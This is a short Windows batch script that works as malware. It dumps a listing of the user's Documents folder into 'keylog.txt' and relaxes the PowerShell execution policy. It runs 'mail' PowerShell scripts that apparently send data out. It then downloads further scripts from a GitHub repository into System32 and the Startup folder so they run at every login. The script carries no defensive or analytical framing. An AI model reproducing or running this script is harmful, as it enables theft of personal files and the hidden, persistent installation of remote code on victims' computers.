cd/
@echo off
cd %USERPROFILE%\OneDrive\Documents\
dir /s > keylog.txt
@echo off
powershell Set-ExecutionPolicy RemoteSigned
powershell Get-ExecutionPolicy
powershell c:/Windows/System32/mail2.ps1
powershell c:/Windows\System32\mail1.ps1
cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/menu.vbs
cd C:\Windows\System32
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail1.ps1
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/mail2.ps1
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/download.vbs
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/start.bat
WScript C:\Windows\System32\download.vbs https://github.com/Quentinq32/clouddrive/raw/main/go.bat